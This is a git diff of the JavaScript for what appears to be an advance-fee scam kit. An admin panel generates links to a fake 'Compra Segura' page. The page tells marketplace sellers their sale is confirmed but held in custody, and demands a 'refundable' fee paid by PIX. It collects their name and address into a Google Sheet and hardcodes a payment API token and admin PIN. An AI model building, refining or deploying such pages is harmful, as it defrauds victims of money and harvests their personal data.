@@ -1,13 +1,11 @@
 // ========================================================
 // ⚙️ CONFIGURAÇÃO CENTRAL
 // ========================================================
-// Substitua pela URL do seu novo Backend unificado
 const BACKEND_URL = 'https://script.google.com/macros/s/AKfycbw0tZ66QIzYiGsD2XNyX9I3dv5r5zfAqPDywPTrRXYJsNsbeJS9Mlo_GdIdynl9p8EwqQ/exec'; 
 const BASE_URL = window.location.href.split('?')[0]; 
 const ADMIN_PIN = "0007"; 
 
 // Configuração da API Invictus Pay
-// ⚠️ NOTA DE SEGURANÇA: A chave está exposta aqui. Futuramente mover para Backend.
 const API_INVICTUS_TOKEN = "wsxiP0Dydmf2TWqjOn1iZk9CfqwxdZBg8w5eQVaTLDWHnTjyvuGAqPBkAiGU";
 const API_INVICTUS_ENDPOINT = "https://api.invictuspay.app.br/api";
 const OFFER_HASH_DEFAULT = "png8aj6v6p"; 
@@ -21,21 +19,18 @@ document.addEventListener('DOMContentLoaded', () => {
   const viewAdmin = document.getElementById('admin-view');
   const viewClient = document.getElementById('client-view');
 
-  // 1. Se tem ID na URL, é Cliente (Checkout)
   if (params.has('id')) {
     showView(viewClient);
     initClientApp(params.get('id'));
     return;
   }
 
-  // 2. Se tem sessão salva, é Admin logado
   if (localStorage.getItem('admin_session_active') === 'true') {
     showView(viewAdmin);
     initAdminApp();
     return;
   }
 
-  // 3. Caso contrário, Tela de Login
   showView(viewLogin);
   initLoginApp(viewLogin, viewAdmin);
 });
@@ -87,14 +82,12 @@ function initAdminApp() {
   const toggleIcon = document.getElementById('toggle-icon');
   const moneyInputs = document.querySelectorAll('.money');
 
-  // Toggle dos campos visuais
   toggleHeader.addEventListener('click', () => {
       const isExpanded = fieldsContainer.classList.toggle('expanded');
       toggleIcon.classList.toggle('rotated');
       fieldsContainer.style.maxHeight = isExpanded ? fieldsContainer.scrollHeight + "px" : "0";
   });
 
-  // Formatação de Moeda (Input Mask)
   const formatMoney = (value) => {
     value = value.replace(/\D/g, "");
     const amount = parseFloat(value) / 100;
@@ -105,7 +98,6 @@ function initAdminApp() {
     input.addEventListener('input', (e) => e.target.value = formatMoney(e.target.value));
   });
 
-  // Submit do Admin (Gerar Link)
   form.addEventListener('submit', async (e) => {
     e.preventDefault();
     btnSalvar.textContent = "Gerando...";
@@ -152,11 +144,9 @@ function initAdminApp() {
 async function initClientApp(id) {
   const containerArea = document.getElementById('client-content-area');
 
-  // 🔥 FIX CORRIGIDO: Formatação visual robusta (Aceita 7.50 e 7,50)
   const formatValueForClient = (value) => {
       if (!value) return ''; 
       
-      // 1. Se já for número (ex: 7.5), formata direto
       if (typeof value === 'number') {
           return value.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
       }
@@ -164,14 +154,11 @@ async function initClientApp(id) {
       let valueStr = String(value).trim();
       valueStr = valueStr.replace(/R\$\s*/g, '');
       
-      // Retorna textos especiais
       if (valueStr.match(/gr[aá]tis|inclusa|horas|vendas|avaliação|taxa de/i)) return valueStr;
 
-      // 2. Se tiver vírgula, assume formato BR (1.000,00) -> remove ponto, troca vírgula
       if (valueStr.includes(',')) {
           valueStr = valueStr.replace(/\./g, '').replace(',', '.');
       }
-      // Se NÃO tiver vírgula (ex: "7.50"), mantém o ponto para o parseFloat
 
       let number = parseFloat(valueStr);
       return !isNaN(number) ? number.toLocaleString('pt-BR', { minimumFractionDigits: 2 }) : valueStr;
@@ -184,14 +171,11 @@ async function initClientApp(id) {
       return isCurrency ? `R$ ${formatted}` : formatted;
   }
 
-  // Conversor seguro para API (centavos)
   const parseMoneyToCents = (val) => {
     if (!val) return 0;
     if (typeof val === 'number') return Math.round(val * 100);
     let valStr = String(val).trim();
-    // Se não tem vírgula nem R$, assume formato float (ex: "7.50")
     if (!valStr.includes(',') && !valStr.includes('R$')) return Math.round(parseFloat(valStr) * 100);
-    // Se tem formatação BR, limpa tudo
     const clean = valStr.replace(/\D/g, '');
     return parseInt(clean, 10);
   };
@@ -209,12 +193,12 @@ async function initClientApp(id) {
   }
 
   try {
-    // 1. Busca dados do pedido no Google Sheets
     const response = await fetch(`${BACKEND_URL}?id=${id}`);
     const json = await response.json();
 
     if (json.status !== 'success') {
-      containerArea.innerHTML = `<div style="text-align:center; padding:40px; color:#ff4d4d;"><h2>Pedido não encontrado.</h2></div>`;
+      // Usando classe utilitária para erro
+      containerArea.innerHTML = `<div class="text-center" style="padding:40px;"><h2 class="text-error">Pedido não encontrado.</h2></div>`;
       return;
     }
 
@@ -222,37 +206,38 @@ async function initClientApp(id) {
     const dados = {};
     Object.keys(dadosBrutos).forEach(key => dados[key.toLowerCase()] = dadosBrutos[key]);
 
-    // Prepara valores
     const valorCobrancaStr = dados.taxa || "R$ 0,00";
     const valorEmCentavos = parseMoneyToCents(valorCobrancaStr);
     const prazo = dados.prazo || '15 minutos';
 
     containerArea.innerHTML = '';
 
-    // 2. Monta a Interface
     const container = criarElemento('div', { class: 'client-container' });
     const imgHeader = criarElemento('div', { class: 'header-image' });
     const title = criarElemento('div', { class: 'header-title', innerHTML: 'Compra Segura' }); 
     const content = criarElemento('div', { class: 'content' });
 
+    // HTML Limpo (Classes em style.css)
     content.innerHTML = `
-      <div style="text-align: center; margin-bottom: 20px;">
-          <h2 style="color: #00bfa5; margin: 0;">🎉 Venda Confirmada!</h2>
-          <p style="font-size: 14px; opacity: 0.8; margin-top: 5px;">Seu anúncio encontrou um comprador.</p>
+      <div class="client-intro">
+          <h2 class="client-success-title">🎉 Venda Confirmada!</h2>
+          <p class="client-subtitle">Seu anúncio encontrou um comprador.</p>
       </div>
 
-      <div style="background: rgba(0, 191, 165, 0.1); border-left: 4px solid #00bfa5; padding: 15px; border-radius: 4px; margin-bottom: 20px; text-align: left;">
-          <p style="margin: 0; font-size: 14px; line-height: 1.5;">
+      <div class="custody-notice">
+          <p class="custody-text">
               Para garantir a segurança da transação, o saldo total está em <strong>Custódia Temporária</strong>.
               <br><br>
-              <strong>Ação Necessária:</strong> Regularize a taxa de <span class="highlight" style="color:#00bfa5">${getDisplayValue(dados.taxa, true, '---')}</span>.
+              <strong>Ação Necessária:</strong> Regularize a taxa de <span class="custody-highlight">${getDisplayValue(dados.taxa, true, '---')}</span>.
               <br>
-              <span style="font-size: 12px; opacity: 0.8;">ℹ️ Este valor é reembolsável junto com a venda em até <strong>${prazo}</strong>.</span>
+              <span class="custody-info">ℹ️ Este valor é reembolsável junto com a venda em até <strong>${prazo}</strong>.</span>
           </p>
       </div>
       
-      <h3 style="border-bottom: 1px solid #333; padding-bottom: 10px; margin-top: 30px; color: #fff; font-size: 16px;">💬 Validação de Segurança</h3>
-      <p style="font-size: 13px; opacity: 0.7; margin-bottom: 15px;">Preencha os dados abaixo para gerar a chave segura de liberação.</p>
+      <div class="security-section">
+        <h3 class="security-title">💬 Validação de Segurança</h3>
+      </div>
+      <p class="security-desc">Preencha os dados abaixo para gerar a chave segura de liberação.</p>
     `;
 
     const formHtml = `
@@ -290,14 +275,13 @@ async function initClientApp(id) {
                 <input type="text" name="city" id="inputCidade" required placeholder="Cidade">
                 <input type="text" name="state" id="inputUf" required placeholder="UF">
             </div>
-            <div class="full-width" id="address-preview" style="font-size:11px; color:#00bfa5; display:none; margin-top:-10px; margin-bottom:10px;">
-            </div>
+            <div class="full-width" id="address-preview"></div>
         </div>
 
         <button type="submit" id="btnPay" class="btn-pay">
             Confirmar Dados para Recebimento
         </button>
-        <p id="msgEnvio" style="text-align:center; font-size:12px; margin-top:10px; opacity:0.7;"></p>
+        <p id="msgEnvio"></p>
       </form>
     `;
     
@@ -309,8 +293,7 @@ async function initClientApp(id) {
     container.appendChild(criarElemento('div', { class: 'footer' }, '&copy; 2025 Plataforma Segura. Todos os direitos reservados.'));
     containerArea.appendChild(container);
 
-    // 3. Lógica do Formulário e ViaCEP
-    const form = document.getElementById('checkoutForm');
+    const formElement = document.getElementById('checkoutForm');
     const btnPay = document.getElementById('btnPay');
     const inputCep = document.getElementById('inputCep');
     const msgEnvio = document.getElementById('msgEnvio');
@@ -336,41 +319,33 @@ async function initClientApp(id) {
         }
     });
 
-    // 🚀 SUBMIT: Salva na Planilha + Gera PIX
-    form.addEventListener('submit', async (e) => {
+    formElement.addEventListener('submit', async (e) => {
       e.preventDefault();
       
       msgEnvio.textContent = "Validando e salvando dados...";
-      msgEnvio.style.color = "#00bfa5";
+      msgEnvio.classList.remove('text-error');
+      msgEnvio.classList.add('text-success');
       
-      const formData = new FormData(form);
+      const formData = new FormData(formElement);
       const customerData = {};
       formData.forEach((value, key) => customerData[key] = value);
 
-      // Defaults de Endereço para API Invictus
       if(!customerData.street_name) customerData.street_name = "Rua Geral";
       if(!customerData.neighborhood) customerData.neighborhood = "Centro";
       if(!customerData.city) customerData.city = "São Paulo";
       if(!customerData.state) customerData.state = "SP";
 
-      // 💾 1. Salvar na Planilha (Aba Cliente)
       try {
           const sheetPayload = {
               action: "salvar_cliente", 
               id: id,                   
               ...customerData           
           };
-
-          // Dispara salvamento (sem travar fluxo de erro fatal)
-          await fetch(BACKEND_URL, {
-              method: 'POST',
-              body: JSON.stringify(sheetPayload) 
-          });
+          await fetch(BACKEND_URL, { method: 'POST', body: JSON.stringify(sheetPayload) });
       } catch (sheetErr) {
           console.error("Aviso: Falha ao salvar backup na planilha.", sheetErr);
       }
 
-      // 💸 2. Gerar PIX na Invictus
       msgEnvio.textContent = "Gerando link seguro...";
       const payload = {
         "amount": valorEmCentavos, 
@@ -395,7 +370,7 @@ async function initClientApp(id) {
 
   } catch (err) {
     console.error(err);
-    containerArea.innerHTML = `<div style="text-align:center; padding:40px; color:#ff4d4d;"><h2>Erro ao carregar. Tente novamente.</h2></div>`;
+    containerArea.innerHTML = `<div class="text-center" style="padding:40px;"><h2 class="text-error">Erro ao carregar. Tente novamente.</h2></div>`;
   }
 }
 
@@ -474,10 +449,10 @@ function showPixModal(data) {
         
         const oldHtml = btnCopy.innerHTML;
         btnCopy.innerHTML = `<i class="fa-solid fa-check"></i> COPIADO!`;
-        btnCopy.style.background = "#00c853";
+        btnCopy.classList.add('copied'); // Usa classe CSS agora
         setTimeout(() => {
             btnCopy.innerHTML = oldHtml;
-            btnCopy.style.background = ""; 
+            btnCopy.classList.remove('copied');
         }, 2000);
     };
 }
